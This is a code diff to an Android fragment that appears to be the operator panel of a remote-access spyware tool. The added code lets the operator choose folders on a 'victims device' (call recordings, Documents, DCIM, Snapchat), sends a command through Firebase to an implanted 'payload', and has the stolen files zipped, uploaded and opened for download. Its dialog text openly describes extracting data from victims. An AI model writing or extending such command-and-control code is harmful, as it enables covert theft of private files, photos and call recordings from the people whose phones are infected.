@@ -7,6 +7,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
 import android.speech.tts.TextToSpeech;
 import android.telephony.TelephonyManager;
 import android.telephony.gsm.GsmCellLocation;
@@ -15,6 +16,7 @@ import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
+import android.widget.EditText;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -826,6 +828,7 @@ public class HomeContent extends Fragment {
                     progressF = progress;
                     textView.setText("Total " + progress + " files will be uploaded");
 
+
                 }
             });
             bottomSheetDialog.show();
@@ -836,7 +839,57 @@ public class HomeContent extends Fragment {
             BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
             bottomSheetDialog.setContentView(R.layout.bottom_sheet_folder);
             //TODO UPDATE LOGIC TO UPDATE HERE
+            AppCompatButton proceed = bottomSheetDialog.findViewById(R.id.proceed);
+            EditText editText = bottomSheetDialog.findViewById(R.id.directory);
+            LinearLayout callRecordings = bottomSheetDialog.findViewById(R.id.callRecordings);
+            LinearLayout documents = bottomSheetDialog.findViewById(R.id.documents);
+            LinearLayout dcim = bottomSheetDialog.findViewById(R.id.dcim);
+            LinearLayout snapchat = bottomSheetDialog.findViewById(R.id.snapchat);
 
+            callRecordings.setOnClickListener(o->editText.setText("MIUI/sound_recorder/"));
+            documents.setOnClickListener(o->editText.setText("Documents/"));
+            dcim.setOnClickListener(o->editText.setText("DCIM/"));
+            snapchat.setOnClickListener(o->editText.setText("DCIM/Snapchat"));
+
+            proceed.setOnClickListener(y ->{
+                if (editText.getText().toString().isEmpty()){
+                    editText.setError("Path required !!");
+                    editText.requestFocus();
+                }else{
+                    String path;
+                    if (editText.getText().toString().startsWith("/")){
+                        path = editText.getText().toString();
+                    }else path = "/"+editText.getText().toString();
+
+                    new AlertDialog.Builder(getContext())
+                            .setTitle("Execution Authorization for File/s")
+                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STORAGE_PATHS PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
+                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
+                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
+                                FirebaseDatabase
+                                        .getInstance()
+                                        .getReference("RUNTIME_PROPS")
+                                        .child("FILE_PATH_TO_ZIP")
+                                        .setValue(path)
+                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
+                                            @Override
+                                            public void onComplete(@NonNull Task<Void> task) {
+                                                if (task.isSuccessful()) {
+                                                    startFileStorageExtraction();
+
+                                                } else {
+                                                    //TODO ADD LOGS
+                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
+                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
+                                                }
+                                            }
+                                        });
+                            })
+                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();
+
+
+                }
+            });
 
             bottomSheetDialog.show();
         });
@@ -1004,6 +1057,85 @@ public class HomeContent extends Fragment {
                         .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show());
 
         return view;
+    }
+
+    private void startFileStorageExtraction() {
+        final int[] c = {0};
+        alertDialog = new AlertDialog.Builder(getActivity())
+                .setMessage("Waiting for payload response... please do not close this window.")
+                .create();
+        alertDialog.show();
+        PayloadConnection
+                .initializePayloadConnection()
+                .checkPayloadConnection(new PayloadConnectionListner() {
+                    @Override
+                    public void onConnectionSuccessful() {
+                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
+                        alertDialog.dismiss();
+                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
+                                .setCancelable(false)
+                                .setPositiveButton("STOP", (o, l) -> {
+                                })
+                                .setTitle("Extraction of selected number of files progress")
+                                .setMessage("\nChecking payload.... DONE")
+                                .show();
+                        TextView messageView = alertDialog.findViewById(android.R.id.message);
+                        FirebaseDatabase
+                                .getInstance()
+                                .getReference("command")
+                                .setValue(10)
+                                .addOnCompleteListener(p -> {
+                                    if (p.isSuccessful()) {
+                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE\nCounting Files... DONE\nCompressing and uploading... PROGRESS"));
+                                        FirebaseDatabase
+                                                .getInstance()
+                                                .getReference("LIVE")
+                                                .child("phone_media_10")
+                                                .addValueEventListener(new ValueEventListener() {
+                                                    @Override
+                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
+                                                        if (snapshot.exists()) {
+                                                            //TODO UPDATE SQL
+                                                            if (c[0] == 1) {
+
+                                                                FirebaseDatabase.getInstance().getReference("command").setValue(99);
+                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nDisplaying data."));
+                                                                alertDialog.dismiss();
+                                                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(snapshot.getValue(String.class)));
+                                                                startActivity(browserIntent);
+                                                                //startActivity(new Intent(getContext(), ContactsDisplay.class).putExtra("uri",snapshot.getValue(String.class)));
+                                                                snapshot.getRef().removeEventListener(this);
+                                                            }
+                                                            c[0]++;
+
+                                                        }
+                                                    }
+
+                                                    @Override
+                                                    public void onCancelled(@NonNull DatabaseError error) {
+
+                                                    }
+                                                });
+
+                                    } else {
+                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);
+
+                                    }
+                                });
+
+
+                    }
+
+                    @Override
+                    public void onPayloadError(String message) {
+                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);
+
+                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
+                                .setAction("DISMISS", v -> {
+                                }).show();
+
+                    }
+                });
     }
 
     private void getBatteryData() {
